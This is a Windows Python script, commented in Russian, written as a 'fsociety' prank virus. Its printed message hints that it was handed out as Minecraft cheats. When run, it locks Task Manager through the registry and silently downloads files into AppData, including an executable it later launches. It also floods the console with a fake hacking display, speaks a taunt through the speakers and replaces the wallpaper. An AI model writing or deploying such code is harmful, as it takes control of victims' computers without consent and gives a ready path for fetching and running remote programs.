import os
import random
import time
import sys
import ctypes
import requests
import subprocess

# ==============================================================================
# НАСТРОЙКА ССЫЛОК С GITHUB (замени на свои RAW-ссылки, когда загрузишь файлы)
# ==============================================================================
IMAGE_URL = "https://unsplash.com" 
SAVE_PATH = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'fsociety_wallpaper.png')

GAME_URL = "https://github.com"
GAME_SAVE_PATH = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'GeometryDash.exe')

CURRENT_DIR = os.getcwd()
FILE_PATH = os.path.join(CURRENT_DIR, 'READ_ME_NOW.txt')

# --- ТВОЯ НОВАЯ ФИШКА: Управление Диспетчером Задач через реестр Windows ---
def set_task_manager_status(disabled_value):
    try:
        # Путь к ветке политик системы в реестре Windows
        registry_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        # Открываем ветку HKEY_CURRENT_USER (0x80000001)
        key = ctypes.windll.advapi32.RegCreateKeyExW(0x80000001, registry_path, 0, None, 0, 0xF003F, None, None, None)
        # Записываем 1 (заблокировать) или 0 (разблокировать)
        ctypes.windll.advapi32.RegSetValueExW(key, "DisableTaskMgr", 0, 4, ctypes.byref(ctypes.c_ulong(disabled_value)), 4)
        ctypes.windll.advapi32.RegCloseKey(key)
    except:
        pass

def download_file(url, path):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            with open(path, 'wb') as f:
                f.write(response.content)
            return True
    except:
        return False
    return False

def maximize_console():
    if os.name == 'nt':
        import keyboard
        time.sleep(0.2)
        keyboard.press_and_release('f11')
        time.sleep(0.3)

def say_phrase(text):
    if os.name == 'nt':
        try:
            import win32com.client
            speaker = win32com.client.Dispatch("SAPI.SpVoice")
            speaker.Speak(text)
        except:
            pass

def create_and_open_prank_file(path):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            f.write("Ты был пранканут вирусом Батыра хахаха\n")
            f.write("=========================================\n")
            f.write("NO MINECRAFT CHEATS FOR YOU! FSOCIETY IS WATCHING.")
        os.startfile(path)
    except:
        pass

# --- НАЧАЛО ХАКЕРСКОГО ПЕРФОРМАНСА ---
if __name__ == "__main__":
    # 1. СРАЗУ ВКЛЮЧАЕМ ЗАЩИТУ: Блокируем Диспетчер задач, чтобы Матрицу нельзя было закрыть
    set_task_manager_status(1)

    # Тихо скачиваем файлы с GitHub в фоне
    download_file(IMAGE_URL, SAVE_PATH)
    download_file(GAME_URL, GAME_SAVE_PATH)
    
    os.system('color 0a')
    os.system('cls')
    
    # 2. Разворачиваем окно на весь экран
    maximize_console()
    time.sleep(0.5)

    matrix_chars = ["V", "I", "R", "U", "S", " ", "S", "E", "E", "S", " ", "E", "V", "E", "R", "Y", "T", "H", "I", "N", "G", "!", "1", "0", "X", "$", "#"]
    glitch_lines = ["[CRITICAL_SYSTEM_ERROR]", "[FSOCIETY_OVERRIDE]", "[REGISTRY_BREACH_DETECTED]", "[CONNECTION_HIJACKED]"]

    # 3. Запускаем Матрицу ровно на 110 строк
    for i in range(110):
        if i > 0 and i % 12 == 0:
            error_msg = random.choice(glitch_lines)
            line = f" \033[31m{error_msg}\033[0m " * 4
            print(line[:120]) 
            time.sleep(0.15)  
        else:
            line = "".join(random.choice(matrix_chars) for _ in range(110))
            print(f"\033[32m{line}\033[0m")
            time.sleep(0.04)

    os.system('cls')
    time.sleep(0.8)
    
    # 4. Создаем и запускаем файл READ_ME_NOW.txt прямо в папке программы
    create_and_open_prank_file(FILE_PATH)
    
    # 5. Компьютер произносит фразу робо-голосом из колонок
    say_phrase("Hello, friend. Fsociety owns you.")
    time.sleep(0.5)
    
    # 6. Принудительно меняем обои на маску Fsociety
    if os.path.exists(SAVE_PATH):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, SAVE_PATH, 3)

    # 7. Автоматически запускаем скачанную игру (Geometry Dash)
    if os.path.exists(GAME_SAVE_PATH):
        subprocess.Popen(GAME_SAVE_PATH)

    # 8. СНИМАЕМ БЛОКИРОВКУ: Возвращаем Диспетчер задач в нормальный рабочий режим перед выходом
    set_task_manager_status(0)

    sys.exit()
